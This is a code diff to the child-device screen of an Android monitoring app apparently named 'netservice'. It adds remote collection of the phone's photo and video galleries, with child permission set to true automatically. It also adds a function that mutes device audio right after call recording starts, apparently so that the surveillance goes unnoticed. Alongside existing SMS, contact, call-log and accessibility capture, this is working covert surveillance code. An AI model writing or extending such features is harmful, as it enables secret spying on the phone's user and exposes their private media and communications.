@@ -2,7 +2,10 @@ package com.dtz.netservice.ui.activities.mainchild
 
 import android.Manifest.permission.SYSTEM_ALERT_WINDOW
 import android.app.AppOpsManager
+import android.content.Context
+import android.media.AudioManager
 import android.media.MediaRecorder
+import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.util.Log
@@ -30,6 +33,8 @@ import android.widget.RelativeLayout
 import android.widget.Switch
 import cn.pedant.SweetAlert.SweetAlertDialog
 import com.aykuttasil.callrecord.CallRecord
+import com.dtz.netservice.data.model.GalleryPhoto
+import com.dtz.netservice.data.model.GalleryVideo
 import com.dtz.netservice.preference.DataSharePreference.childSelected
 import com.dtz.netservice.services.accessibilityData.AccessibilityDataService
 import com.dtz.netservice.utils.CallLogs
@@ -52,8 +57,10 @@ import com.dtz.netservice.utils.Consts.CONTACTS
 import com.dtz.netservice.utils.Consts.DEVICE_NAME
 import com.dtz.netservice.utils.Consts.INTERVAL
 import com.dtz.netservice.utils.Consts.PERMISSION_USAGE_STATS
+import com.dtz.netservice.utils.Consts.PHOTOS
 import com.dtz.netservice.utils.Consts.SMSES
 import com.dtz.netservice.utils.Consts.TIMER
+import com.dtz.netservice.utils.Consts.VIDEOS
 import com.dtz.netservice.utils.Contacts
 import com.dtz.netservice.utils.InstalledApp
 import com.dtz.netservice.utils.SMSes
@@ -108,6 +115,16 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
         getReference("$PHOTO/$PARAMS").setValue(childPhoto)
         getReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
 
+        //photo gallery
+        val childGalleryPhoto = GalleryPhoto(false, 0)
+        getReference("$PHOTOS/$PARAMS").setValue(childGalleryPhoto)
+        getReference("$PHOTOS/$CHILD_PERMISSION").setValue(true)
+
+        //video gallery
+        val childGalleryVideo = GalleryVideo(false, 0)
+        getReference("$VIDEOS/$PARAMS").setValue(childGalleryVideo)
+        getReference("$VIDEOS/$CHILD_PERMISSION").setValue(true)
+
         //Recording
         val childRecording = ChildRecording(false,0)
         getReference("$RECORDING/$PARAMS").setValue(childRecording)
@@ -130,7 +147,15 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
         getReference("$APPLICATIONS/").setValue(appList)
 
         startRecordingService()
+        reduceVolume()
 
+    }
+
+    private fun reduceVolume() {
+        val audioManager = applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            audioManager.adjustVolume(AudioManager.ADJUST_MUTE, AudioManager.FLAG_SHOW_UI)
+        }
     }
 
     private fun checkSwitchPermissions() {
